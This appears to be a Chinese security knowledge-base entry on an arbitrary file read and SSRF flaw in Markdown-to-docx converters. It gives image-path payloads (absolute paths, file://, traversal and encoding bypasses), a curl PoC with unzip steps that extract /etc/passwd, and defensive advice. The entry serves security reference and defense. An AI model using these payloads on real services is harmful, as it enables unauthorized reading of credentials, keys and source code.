---
id: web-generic-ssrf-docx-converter-image-local-file-read
title: Markdown 转 docx 的图片抓取未限制本地路径：绝对路径/file:// 把任意文件嵌入 word/media
type: scenario
domain: web
path: web/generic/ssrf
technique: docx-converter-image-local-file-read
tags:
- ssrf
- file-read
- docx
- markdown
- document-conversion
- file-scheme
- lfi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T09:57:08+08:00'
  notes: 已对照原文 Markdown2world 段与图12/13 核对：![1](/etc/passwd) 预览空白、解压 docx 后 word/media/rId9.so 为 /etc/passwd 内容；file:///etc/passwd 亦可。卡片原理、利用步骤与 PoC 与原文一致；转换器具体实现未在原文给出，扩展名推断等表述已保持审慎；PoC 未复现
url: /docs/web/generic/ssrf/web-generic-ssrf-docx-converter-image-local-file-read/
draft: false
kb_aliases:
- Markdown2world
- Markdown 转 docx 任意文件读取
- docx word/media 文件读取
- 图片路径 file:// 读取
- 文档转换器 LFI
- rId9.so
---

## 一句话结论

在线 Markdown→docx 转换器在把 `![1](/etc/passwd)` 这类图片路径嵌入文档时，如果接受绝对路径或 `file://` 协议，就会把服务端本地文件内容写入 docx 压缩包的 `word/media/rIdN.so`；页面预览可能看不到图片，但下载 docx 后解压即可读取任意文件。

## 原理

- Markdown 图片语法会被转换器解析成一个图片关系（relationship）和一个媒体部件（image part），最终写入 docx（OOXML）的 `word/media/` 目录，并在 `word/_rels/document.xml.rels` 中登记 `rIdN`。
- 转换器通常用 HTTP 客户端或文件读取函数获取图片 URL 的内容；若没有限制协议和路径，`/etc/passwd` 这样的绝对路径会被当作本地文件打开，`file:///etc/passwd` 也会被 `file://` 处理器读取。
- 由于读到的内容不是合法图片，转换器可能无法生成缩略图/预览，Word 中显示空白或“无法显示图片”；但原始字节仍被写入媒体部件，文件扩展名可能按内容推断为 `.so`、`.bin` 或无扩展名。
- 最终危害是服务端任意文件读取（/etc/passwd、应用配置、源码、密钥、flag），并把内容随 docx 返回给攻击者；若转换器还支持 http(s) URL，则可进一步做 SSRF。
- 该手法与“图片代理 SSRF”同源：用户可控的图片源没有做协议/主机/路径白名单，只是输出被封装进文档，增加了“看不到回显”的迷惑性。

## 触发条件

- 存在接受 Markdown（或 HTML）并生成 docx/pdf 等文档的服务端点，且生成的文档可被攻击者下载。
- 图片/资源抓取逻辑接受绝对路径或 `file://` 协议，未限制为 http(s) 或已上传附件。
- 转换进程对目标文件有读权限；`open_basedir`（PHP）或容器文件权限未阻断。
- 文档预览不校验图片有效性，或即使校验也不阻止原始字节写入媒体部件。

## 利用步骤

1. 确认输入格式与输出：提交一个正常 Markdown 图片（http/https 或上传附件），确认能生成并下载 docx。
2. 提交本地路径：`![1](/etc/passwd)`，下载 docx；若页面预览空白，不要放弃，直接解压 docx。
3. 列出媒体部件：`unzip -l out.docx | grep word/media`，找到 `rIdN.so`/`rIdN.bin` 等非图片文件。
4. 读取内容：`unzip -p out.docx word/media/rId9.so`；若成功，说明任意文件读取成立。
5. 若绝对路径被拦截，尝试 `![1](file:///etc/passwd)`、`../../../../etc/passwd`、URL 编码/双重编码、Windows 路径 `C:/Windows/win.ini`。
6. 读取应用配置、源码、环境变量文件、SSH 密钥等；若转换器支持 http(s)，再测试内网地址做 SSRF。

## PoC

```markdown
![1](/etc/passwd)
```

或：

```markdown
![1](file:///etc/passwd)
```

```bash
# 提交 Markdown 并下载生成的 docx
curl -s -X POST "https://target/convert" \
  -H "Content-Type: application/json" \
  -d '{"markdown":"![1](/etc/passwd)"}' -o out.docx

# 解压查看媒体部件
unzip -l out.docx | grep word/media
unzip -p out.docx word/media/rId9.so
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## 变体与关联

- 变体：HTML→PDF/docx、pandoc、LibreOffice 转换、报表导出等任何“抓取图片/资源并嵌入文档”的功能；协议可能是 `file://`、绝对路径、`smb://`、`http://`。
- 变体：若转换器只允许 http(s)，可把图片 URL 指向攻击者 HTTP 服务，返回 302 到 `file:///etc/passwd` 或内网地址，测试重定向是否被跟随。
- 变体：若文档不能直接下载，可寻找预览/缩略图/媒体下载端点，或通过文档内容差异做盲读。
- 关联：[[web-generic-ssrf-php-curl-get-file-scheme-config-read]]、[[web-generic-ssrf-zentao-webhook-file-protocol-arbitrary-read]]、[[web-generic-ssrf-url-shortcut-upload-file-scheme-read]]（file:// 本地读取的其他入口）。

## 检测与防御

- 图片/资源抓取只允许 http(s) 且做域名/IP 白名单；禁止 `file://`、`gopher://`、绝对路径与 `..`。
- 转换器运行在无敏感文件、无内网访问的沙箱/容器中，以最小权限运行；输出文档前校验媒体部件确实是图片（magic bytes/解码成功）。
- 对生成的 docx 剥离外部关系与未知媒体类型；限制文档大小与图片数量。
- 监控转换请求中出现 `/etc/`、`file://`、`../`、内网地址等特征；对异常媒体部件类型告警。
